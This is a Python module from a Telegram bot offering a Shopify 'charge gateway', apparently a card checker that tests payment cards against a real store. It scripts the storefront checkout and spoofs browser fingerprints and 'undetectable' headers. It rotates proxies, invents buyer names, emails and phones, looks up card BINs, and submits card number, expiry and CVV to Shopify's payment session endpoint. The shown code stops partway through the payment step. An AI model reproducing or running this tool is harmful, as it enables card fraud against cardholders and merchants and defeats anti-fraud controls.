# BOT/gates/charge/shopify/shopify.py
# Shopify Charge Gateway - Updated with real Shopify flow
# Uses meta-app-prod-store-1.myshopify.com with product "retailer-id-fix-no-mapping"
# Fixed based on actual network traffic analysis

import json
import asyncio
import re
import time
import httpx
import random
import string
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Import proxy system
try:
    from BOT.tools.proxy import get_proxy_for_user, mark_proxy_success, mark_proxy_failed
    PROXY_ENABLED = True
except ImportError:
    PROXY_ENABLED = False

# Custom logger with emoji formatting
class EmojiLogger:
    def __init__(self):
        pass

    def info(self, message):
        print(f"🔹 {message}")

    def success(self, message):
        print(f"✅ {message}")

    def warning(self, message):
        print(f"⚠️ {message}")

    def error(self, message):
        print(f"❌ {message}")

    def step(self, step_num, total_steps, message):
        print(f"🔸 [{step_num}/{total_steps}] {message}")

    def network(self, message):
        print(f"🌐 {message}")

    def card(self, message):
        print(f"💳 {message}")

    def shopify(self, message):
        print(f"🛍️ {message}")

    def debug_response(self, message):
        print(f"🔧 {message}")

    def bin_info(self, message):
        print(f"🏦 {message}")

    def user(self, message):
        print(f"👤 {message}")

    def proxy(self, message):
        print(f"🔌 {message}")

# Create global logger instance
logger = EmojiLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="sh"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()
    
    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

import os

class ShopifyChargeChecker:
    def __init__(self, user_id=None):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36"
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
        self.product_url = f"{self.base_url}/products/retailer-id-fix-no-mapping"
        self.user_id = user_id
        self.current_proxy = None
        
        # Shopify specific cookies and tokens
        self.cookies = {}
        self.checkout_token = None
        self.session_token = None
        self.x_checkout_one_session_token = None
        self.x_checkout_web_build_id = "5927fca009d35ac648408d54c8d94b0d54813e89"
        self.cart_token = None
        
        # Fixed address details
        self.fixed_address = {
            'address1': '8 Log Pond Drive',
            'address2': '',
            'city': 'Horsham',
            'state': 'PA',
            'zip': '19044',
            'country': 'US',
            'phone': None  # Will be generated
        }
        
        # BIN services
        self.bin_services = [
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            },
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            }
        ]
        
        # Shopify error patterns
        self.shopify_errors = {
            # Card errors
            "your card was declined": "CARD_DECLINED",
            "card has been declined": "CARD_DECLINED",
            "card_declined": "CARD_DECLINED",
            "incorrect_cvc": "INCORRECT_CVC",
            "expired_card": "EXPIRED_CARD",
            "incorrect_number": "INCORRECT_NUMBER",
            "invalid_account": "INVALID_ACCOUNT",
            "account_closed": "ACCOUNT_CLOSED",
            "lost_card": "LOST_CARD",
            "stolen_card": "STOLEN_CARD",
            "insufficient_funds": "INSUFFICIENT_FUNDS",
            "credit_limit_exceeded": "CREDIT_LIMIT_EXCEEDED",
            "processing_error": "PROCESSING_ERROR",
            
            # Shopify specific errors
            "captcha_required": "CAPTCHA_REQUIRED",
            "captcha failed": "CAPTCHA_FAILED",
            "rate limit": "RATE_LIMITED",
            "too many requests": "RATE_LIMITED",
            "invalid request": "INVALID_REQUEST",
            "session expired": "SESSION_EXPIRED",
            "checkout not found": "CHECKOUT_NOT_FOUND",
            "product not available": "PRODUCT_UNAVAILABLE",
            "out of stock": "OUT_OF_STOCK",
            
            # Address errors
            "invalid shipping address": "INVALID_ADDRESS",
            "invalid billing address": "INVALID_ADDRESS",
            "address verification failed": "ADDRESS_VERIFICATION_FAILED",
            
            # Gateway errors
            "payment gateway error": "GATEWAY_ERROR",
            "payment provider error": "GATEWAY_ERROR",
            "transaction failed": "TRANSACTION_FAILED",
            "authorization failed": "AUTHORIZATION_FAILED",
            
            # 3D Secure
            "3d_secure_required": "3D_SECURE_REQUIRED",
            "3d secure authentication": "3D_SECURE_REQUIRED",
            "authentication required": "3D_SECURE_REQUIRED",
            
            # Fraud detection
            "suspected fraud": "FRAUD_DETECTED",
            "fraudulent": "FRAUD_DETECTED",
            "suspicious activity": "FRAUD_DETECTED",
            "security violation": "FRAUD_DETECTED",
            
            # Network errors
            "timeout": "TIMEOUT_ERROR",
            "connection error": "CONNECTION_ERROR",
            "network error": "NETWORK_ERROR",
            
            # Shopify checkout errors
            "checkout is locked": "CHECKOUT_LOCKED",
            "checkout is completed": "CHECKOUT_COMPLETED",
            "checkout is expired": "CHECKOUT_EXPIRED",
        }
        
        # Generate random browser fingerprints
        self.generate_browser_fingerprint()
        
        # Initialize with proxy if available
        if PROXY_ENABLED and user_id:
            self.current_proxy = get_proxy_for_user(user_id, "random")
            if self.current_proxy:
                logger.proxy(f"Using proxy: {self.current_proxy[:50]}...")
        
    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints"""
        if "Windows" in self.user_agent:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'
        elif "Macintosh" in self.user_agent:
            self.platform = "MacIntel"
            self.sec_ch_ua_platform = '"macOS"'
        elif "Linux" in self.user_agent:
            self.platform = "Linux x86_64"
            self.sec_ch_ua_platform = '"Linux"'
        elif "iPhone" in self.user_agent or "iPad" in self.user_agent:
            self.platform = "iPhone"
            self.sec_ch_ua_platform = '"iOS"'
        elif "Android" in self.user_agent:
            self.platform = "Linux armv8l"
            self.sec_ch_ua_platform = '"Android"'
        else:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'

        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
        if chrome_version:
            version = chrome_version.group(1)
            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
        else:
            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="144", "Google Chrome";v="144"'

        self.sec_ch_ua_mobile = "?0" if "Mobile" not in self.user_agent else "?1"
        
        # Screen resolution
        self.screen_resolutions = [
            "1920x1080", "1366x768", "1536x864", "1440x900", 
            "1280x720", "1600x900", "2560x1440", "3840x2160"
        ]
        self.screen_resolution = random.choice(self.screen_resolutions)
        
        # Timezone
        self.timezones = [
            "America/New_York", "America/Chicago", "America/Denver", 
            "America/Los_Angeles", "Europe/London", "Europe/Paris",
            "Asia/Tokyo", "Australia/Sydney"
        ]
        self.timezone = random.choice(self.timezones)
        
        # Languages
        self.languages = [
            "en-US,en;q=0.9", "en-GB,en;q=0.8", "en-CA,en;q=0.9,fr;q=0.8",
            "en-AU,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"
        ]
        self.accept_language = random.choice(self.languages)
        
        # Connection type
        self.connection_type = random.choice(["keep-alive", "close"])

    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
            'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'ID': '🇮🇩', 'PH': '🇵🇭',
            'VN': '🇻🇳', 'BD': '🇧🇩', 'PK': '🇵🇰', 'NG': '🇳🇬', 'ZA': '🇿🇦',
            'BE': '🇧🇪', 'AT': '🇦🇹', 'PT': '🇵🇹', 'IE': '🇮🇪', 'NZ': '🇳🇿',
            'EG': '🇪🇬', 'MA': '🇲🇦'
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')

    def get_base_headers(self):
        """Get undetectable base headers"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Cache-Control': 'max-age=0',
            'Connection': self.connection_type,
            'DNT': '1',
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent,
            'Viewport-Width': self.screen_resolution.split('x')[0],
            'Width': self.screen_resolution.split('x')[0]
        }

    def get_shopify_headers(self, referer=None):
        """Get headers for Shopify requests"""
        headers = self.get_base_headers()
        if referer:
            headers['Referer'] = referer
        headers['Origin'] = self.base_url
        return headers

    def get_graphql_headers(self):
        """Get headers for GraphQL requests"""
        headers = {
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': self.base_url,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': self.user_agent,
            'X-Requested-With': 'XMLHttpRequest',
            'shopify-checkout-client': 'checkout-web/1.0'
        }
        
        if self.x_checkout_one_session_token:
            headers['x-checkout-one-session-token'] = self.x_checkout_one_session_token
        
        if self.checkout_token:
            headers['shopify-checkout-source'] = f'id="{self.checkout_token}", type="cn"'
        
        return headers

    def parse_binlist_net(self, data):
        scheme = data.get('scheme', 'N/A').upper()
        if scheme == 'N/A':
            scheme = data.get('brand', 'N/A').upper()

        card_type = data.get('type', 'N/A').upper()
        brand = data.get('brand', 'N/A')
        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
        country_name = data.get('country', {}).get('name', 'N/A')
        country_code = data.get('country', {}).get('alpha2', 'N/A')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        brand_display = brand.upper() if brand != 'N/A' else 'N/A'
        flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': scheme,
            'type': card_type,
            'brand': brand_display,
            'bank': bank_name,
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A',
                    'emoji': '🏳️'
                }

        country_code = data.get('country', 'N/A')
        country_name = data.get('country_name', country_code)
        flag_emoji = data.get('country_flag', '🏳️')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
            if country_code != 'N/A' and len(country_code) == 2:
                flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A').upper(),
            'bank': data.get('bank', 'N/A').upper(),
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    async def get_bin_info(self, cc):
        """Get BIN information"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }

        for service in self.bin_services:
            try:
                url = service['url'].format(bin=bin_number)
                headers = service['headers']

                async with httpx.AsyncClient(timeout=10.0) as client:
                    response = await client.get(url, headers=headers)

                    if response.status_code == 200:
                        data = response.json()
                        result = service['parser'](data)
                        
                        if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
                            result['emoji'] = self.get_country_emoji(result['country_code'])

                        self.bin_cache[bin_number] = result
                        return result
            except Exception as e:
                logger.warning(f"{service['name']} failed: {e}")
                continue

        self.bin_cache[bin_number] = default_response
        return default_response

    def generate_email(self):
        """Generate random email"""
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com']
        first_names = ['john', 'michael', 'david', 'james', 'robert', 'william']
        last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'miller']
        
        first = random.choice(first_names)
        last = random.choice(last_names)
        domain = random.choice(domains)
        
        # Random email patterns
        patterns = [
            f"{first}.{last}{random.randint(1, 999)}@{domain}",
            f"{first}{last}{random.randint(1, 99)}@{domain}",
            f"{first}_{last}@{domain}",
            f"{last}.{first}{random.randint(1, 9)}@{domain}"
        ]
        
        return random.choice(patterns)

    def generate_phone(self):
        """Generate US phone number"""
        area_codes = ['201', '202', '203', '205', '206', '207', '208', '209',
                     '210', '212', '213', '214', '215', '216', '217', '218']
        
        area = random.choice(area_codes)
        prefix = random.randint(200, 999)
        line = random.randint(1000, 9999)
        
        return f"+1{area}{prefix}{line}"

    def generate_name(self):
        """Generate random name"""
        first_names = ['John', 'Michael', 'David', 'James', 'Robert', 'William',
                      'Mary', 'Jennifer', 'Linda', 'Patricia', 'Elizabeth', 'Susan']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller',
                     'Davis', 'Garcia', 'Rodriguez', 'Wilson', 'Martinez']
        
        return random.choice(first_names), random.choice(last_names)

    def detect_error_type(self, error_message):
        """Detect Shopify error type from error message"""
        if not error_message:
            return "UNKNOWN_ERROR"
        
        error_lower = error_message.lower()
        
        for pattern, error_type in self.shopify_errors.items():
            if pattern in error_lower:
                return error_type
        
        # Check for specific patterns
        if "declined" in error_lower:
            return "CARD_DECLINED"
        elif "cvv" in error_lower or "security code" in error_lower:
            return "INCORRECT_CVC"
        elif "expired" in error_lower:
            return "EXPIRED_CARD"
        elif "invalid" in error_lower:
            return "INVALID_CARD"
        elif "fund" in error_lower:
            return "INSUFFICIENT_FUNDS"
        elif "limit" in error_lower:
            return "CREDIT_LIMIT_EXCEEDED"
        
        return "UNKNOWN_ERROR"

    def clean_error_message(self, message):
        """Clean and format error message"""
        if not message:
            return "Unknown error"
        
        # Remove HTML tags
        message = re.sub(r'<[^>]+>', '', message).strip()
        
        # Remove common prefixes
        prefixes = [
            "error: ", "sorry, ", "payment failed: ", "transaction failed: ",
            "there was an error: ", "we're sorry, ", "unable to process: "
        ]
        
        for prefix in prefixes:
            if message.lower().startswith(prefix.lower()):
                message = message[len(prefix):].strip()
                break
        
        # Capitalize first letter
        if message:
            message = message[0].upper() + message[1:]
        
        return message

    async def human_delay(self, min_delay=1, max_delay=3):
        """Simulate human delay between actions"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)

    async def make_request(self, client, method, url, **kwargs):
        """Make request with proxy support and error handling"""
        try:
            # Add headers if not present
            if 'headers' not in kwargs:
                kwargs['headers'] = self.get_shopify_headers()
            
            # Add timeout if not present
            if 'timeout' not in kwargs:
                kwargs['timeout'] = 30.0
            
            # Add cookies if we have them
            if self.cookies and 'cookies' not in kwargs:
                kwargs['cookies'] = self.cookies
            
            # Make request
            start_time = time.time()
            response = await client.request(method, url, **kwargs)
            response_time = time.time() - start_time
            
            # Update proxy stats if proxy was used
            if self.current_proxy and PROXY_ENABLED:
                if response.status_code < 400:
                    mark_proxy_success(self.current_proxy, response_time)
                else:
                    mark_proxy_failed(self.current_proxy)
            
            # Update cookies from response
            if 'set-cookie' in response.headers:
                cookie_header = response.headers.get('set-cookie', '')
                cookies_list = cookie_header.split(', ')
                for cookie in cookies_list:
                    if '=' in cookie:
                        name_value = cookie.split(';')[0]
                        if '=' in name_value:
                            name, value = name_value.split('=', 1)
                            self.cookies[name] = value
            
            return response
            
        except Exception as e:
            # Update proxy stats on failure
            if self.current_proxy and PROXY_ENABLED:
                mark_proxy_failed(self.current_proxy)
            raise e

    async def browse_store(self, client):
        """Browse Shopify store to get initial cookies"""
        try:
            logger.step(1, 8, "Browsing store...")
            
            response = await self.make_request(
                client, 'GET', self.base_url
            )
            
            if response.status_code in [200, 304]:
                logger.success("Store accessed successfully")
                return True, None
            else:
                return False, f"Store access failed: {response.status_code}"
                
        except Exception as e:
            return False, f"Store browsing error: {str(e)}"

    async def view_product(self, client):
        """View product page"""
        try:
            logger.step(2, 8, "Viewing product...")
            
            response = await self.make_request(
                client, 'GET', self.product_url,
                headers=self.get_shopify_headers(referer=self.base_url)
            )
            
            if response.status_code == 200:
                # Extract variant ID from the page
                html_content = response.text
                
                # Try different patterns to find variant ID
                patterns = [
                    r'data-productid="(\d+)"',
                    r'value="(\d+)"\s*data-variant',
                    r'variant_id["\']?\s*:\s*["\']?(\d+)["\']?',
                    r'id["\']?\s*:\s*["\']?(\d+)["\']?\s*,\s*["\']?product_id["\']?',
                    r'"id"\s*:\s*(\d+)\s*,\s*"product_id"'
                ]
                
                variant_id = None
                for pattern in patterns:
                    match = re.search(pattern, html_content)
                    if match:
                        variant_id = match.group(1)
                        logger.debug_response(f"Found variant ID with pattern: {pattern[:30]}...")
                        break
                
                if not variant_id:
                    # Default variant ID from network logs
                    variant_id = "42974272290658"
                
                self.variant_id = variant_id
                logger.success(f"Product viewed successfully, variant ID: {variant_id}")
                return True, None
            else:
                return False, f"Product view failed: {response.status_code}"
                
        except Exception as e:
            return False, f"Product view error: {str(e)}"

    async def add_to_cart(self, client):
        """Add product to cart using the correct Shopify flow"""
        try:
            logger.step(3, 8, "Adding to cart...")
            
            # From logs, we need to POST to /cart/add with form data
            add_to_cart_url = f"{self.base_url}/cart/add"
            
            # Prepare form data
            form_data = {
                'id': self.variant_id,
                'quantity': '1'
            }
            
            headers = self.get_shopify_headers(referer=self.product_url)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers['Upgrade-Insecure-Requests'] = '1'
            
            response = await self.make_request(
                client, 'POST', add_to_cart_url,
                data=form_data,
                headers=headers,
                follow_redirects=True
            )
            
            if response.status_code in [200, 302]:
                # Extract cart token from cookies
                if 'cart' in self.cookies:
                    cart_cookie = self.cookies['cart']
                    # Extract cart token from cookie value
                    if '?' in cart_cookie:
                        cart_cookie = cart_cookie.split('?')[0]
                    self.cart_token = cart_cookie
                    logger.success(f"Added to cart successfully, cart token: {self.cart_token}")
                else:
                    # Try to extract from response
                    cart_pattern = r'cart=([a-zA-Z0-9]+)'
                    if 'set-cookie' in response.headers:
                        cookies = response.headers.get('set-cookie', '')
                        cart_match = re.search(cart_pattern, cookies)
                        if cart_match:
                            self.cart_token = cart_match.group(1)
                            self.cookies['cart'] = self.cart_token
                            logger.success(f"Added to cart, extracted cart token: {self.cart_token}")
                
                return True, None
            else:
                return False, f"Add to cart failed: {response.status_code}"
                
        except Exception as e:
            return False, f"Add to cart error: {str(e)}"

    async def go_to_checkout(self, client):
        """Go to checkout page using the correct Shopify flow"""
        try:
            logger.step(4, 8, "Going to checkout...")
            
            # First, view the cart page
            cart_url = f"{self.base_url}/cart"
            
            response = await self.make_request(
                client, 'GET', cart_url,
                headers=self.get_shopify_headers(referer=self.product_url)
            )
            
            if response.status_code != 200:
                return False, f"Cart page failed: {response.status_code}"
            
            # Now POST to /cart to initiate checkout (as seen in logs)
            checkout_init_url = f"{self.base_url}/cart"
            
            form_data = {
                'updates[]': '1',
                'checkout': ''
            }
            
            headers = self.get_shopify_headers(referer=cart_url)
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            
            response = await self.make_request(
                client, 'POST', checkout_init_url,
                data=form_data,
                headers=headers,
                follow_redirects=False  # Don't follow redirects, we need to handle them
            )
            
            if response.status_code == 302:
                # Get the redirect location
                redirect_url = response.headers.get('location', '')
                
                if redirect_url:
                    # Extract checkout token from redirect URL
                    # Pattern: /checkouts/cn/{token}/en-us
                    token_pattern = r'/checkouts/cn/([a-zA-Z0-9]+)'
                    token_match = re.search(token_pattern, redirect_url)
                    
                    if token_match:
                        self.checkout_token = token_match.group(1)
                        logger.success(f"Checkout initiated, token: {self.checkout_token}")
                        
                        # Now follow the redirect
                        follow_response = await self.make_request(
                            client, 'GET', redirect_url,
                            headers=self.get_shopify_headers(referer=cart_url)
                        )
                        
                        if follow_response.status_code in [200, 302]:
                            logger.success("Checkout page loaded")
                            return True, None
                        else:
                            return False, f"Follow redirect failed: {follow_response.status_code}"
                    else:
                        return False, f"No checkout token in redirect URL: {redirect_url}"
                else:
                    return False, "No redirect location in response"
            else:
                return False, f"Checkout initiation failed: {response.status_code}"
                
        except Exception as e:
            return False, f"Checkout error: {str(e)}"

    async def get_checkout_data(self, client):
        """Get checkout data via GraphQL"""
        try:
            logger.step(5, 8, "Fetching checkout data...")
            
            if not self.checkout_token:
                return False, "No checkout token"
            
            graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted?operationName=Proposal"
            
            # Generate session token (from logs: x-checkout-one-session-token)
            self.x_checkout_one_session_token = self.generate_session_token()
            
            graphql_headers = self.get_graphql_headers()
            
            # Add additional headers from logs
            graphql_headers['x-checkout-web-build-id'] = self.x_checkout_web_build_id
            graphql_headers['x-checkout-web-deploy-stage'] = 'production'
            graphql_headers['x-checkout-web-server-handling'] = 'fast'
            graphql_headers['x-checkout-web-server-rendering'] = 'yes'
            graphql_headers['x-checkout-web-source-id'] = self.checkout_token
            
            graphql_payload = {
                "operationName": "Proposal",
                "variables": {
                    "sessionInput": {
                        "locale": "en-US",
                        "countryCode": "US"
                    }
                },
                "id": "4abf98439cf21062e036dd8d2e449f5e15e12d9d358a82376aa630c7c8c8c81e"
            }
            
            response = await self.make_request(
                client, 'POST', graphql_url,
                json=graphql_payload,
                headers=graphql_headers
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'data' in data:
                    logger.success("Checkout data fetched")
                    return True, data['data']
                else:
                    logger.debug_response(f"GraphQL response: {json.dumps(data, indent=2)[:500]}...")
                    return False, "No data in GraphQL response"
            else:
                logger.debug_response(f"GraphQL failed with status: {response.status_code}")
                return False, f"GraphQL failed: {response.status_code}"
                
        except Exception as e:
            logger.error(f"Checkout data error: {str(e)}")
            return False, f"Checkout data error: {str(e)}"

    def generate_session_token(self):
        """Generate session token similar to Shopify's format"""
        chars = string.ascii_letters + string.digits + "-_"
        token_parts = []
        
        # Generate parts similar to the token in logs
        for i in range(5):
            part_length = random.randint(20, 40)
            part = ''.join(random.choice(chars) for _ in range(part_length))
            token_parts.append(part)
        
        return '-'.join(token_parts)

    async def fill_shipping_info(self, client):
        """Fill shipping information - Always use pickup"""
        try:
            logger.step(6, 8, "Filling shipping info...")
            
            if not self.checkout_token:
                return False, "No checkout token"
            
            # Generate user info
            first_name, last_name = self.generate_name()
            email = self.generate_email()
            phone = self.generate_phone()
            
            # Update address with phone
            self.fixed_address['phone'] = phone
            
            # Prepare shipping data using GraphQL (from logs)
            shipping_url = f"{self.base_url}/checkouts/{self.checkout_token}/shipping_rates.json"
            
            shipping_data = {
                "shipping_address": {
                    "first_name": first_name,
                    "last_name": last_name,
                    "address1": self.fixed_address['address1'],
                    "address2": self.fixed_address['address2'],
                    "city": self.fixed_address['city'],
                    "province": self.fixed_address['state'],
                    "zip": self.fixed_address['zip'],
                    "country": self.fixed_address['country'],
                    "phone": phone
                },
                "email": email
            }
            
            shipping_headers = self.get_shopify_headers(
                referer=f"{self.base_url}/checkouts/{self.checkout_token}"
            )
            shipping_headers['Content-Type'] = 'application/json'
            
            response = await self.make_request(
                client, 'POST', shipping_url,
                json=shipping_data,
                headers=shipping_headers
            )
            
            if response.status_code == 200:
                shipping_rates = response.json()
                
                # Look for pickup option
                pickup_rate = None
                for rate in shipping_rates.get('shipping_rates', []):
                    if 'pickup' in rate.get('name', '').lower() or 'local' in rate.get('name', '').lower():
                        pickup_rate = rate
                        break
                
                if pickup_rate:
                    # Select pickup option
                    select_url = f"{self.base_url}/checkouts/{self.checkout_token}/shipping_rates/{pickup_rate['id']}.json"
                    
                    select_response = await self.make_request(
                        client, 'PUT', select_url,
                        headers=shipping_headers
                    )
                    
                    if select_response.status_code == 200:
                        logger.success("Pickup shipping selected")
                        return True, {
                            'first_name': first_name,
                            'last_name': last_name,
                            'email': email,
                            'phone': phone,
                            'address': self.fixed_address
                        }
                    else:
                        return False, f"Pickup selection failed: {select_response.status_code}"
                else:
                    # No pickup available, use first shipping rate
                    if shipping_rates.get('shipping_rates'):
                        first_rate = shipping_rates['shipping_rates'][0]
                        select_url = f"{self.base_url}/checkouts/{self.checkout_token}/shipping_rates/{first_rate['id']}.json"
                        
                        select_response = await self.make_request(
                            client, 'PUT', select_url,
                            headers=shipping_headers
                        )
                        
                        if select_response.status_code == 200:
                            logger.success("Default shipping selected")
                            return True, {
                                'first_name': first_name,
                                'last_name': last_name,
                                'email': email,
                                'phone': phone,
                                'address': self.fixed_address
                            }
                        else:
                            return False, f"Shipping selection failed: {select_response.status_code}"
                    else:
                        return False, "No shipping rates available"
            else:
                return False, f"Shipping info failed: {response.status_code}"
                
        except Exception as e:
            return False, f"Shipping info error: {str(e)}"

    async def submit_payment(self, client, card_details, user_info):
        """Submit payment with card details using the payment session API"""
        try:
            logger.step(7, 8, "Submitting payment...")
            
            if not self.checkout_token:
                return False, "No checkout token"
            
            cc, mes, ano, cvv = card_details
            
            # First, create a payment session (from logs: checkout.pci.shopifyinc.com/sessions)
            session_url = "https://checkout.pci.shopifyinc.com/sessions"
            
            session_headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'User-Agent': self.user_agent,
                'shopify-identification-signature': self.generate_shopify_signature()
            }
            
            session_data = {
                "credit_card": {
                    "number": cc.replace(' ', ''),
                    "month": int(mes),
                    "year": int(ano),
                    "verification_value": cvv,
                    "start_month": None,
                    "start_year": None
                },
                "payment_session_scope": "meta-app-prod-store-1.myshopify.com"
            }
            
            # Create session
            session_response = await client.post(
                session_url,
                json=session_data,
                headers=session_headers,
                timeout=30.0
            )
            
            if session_response.status_code != 200:
                return False, f"Payment session creation failed: {session_response.status_code}"
            
            session_result = session_response.json()
            payment_session_id = session_result.get('id')
            
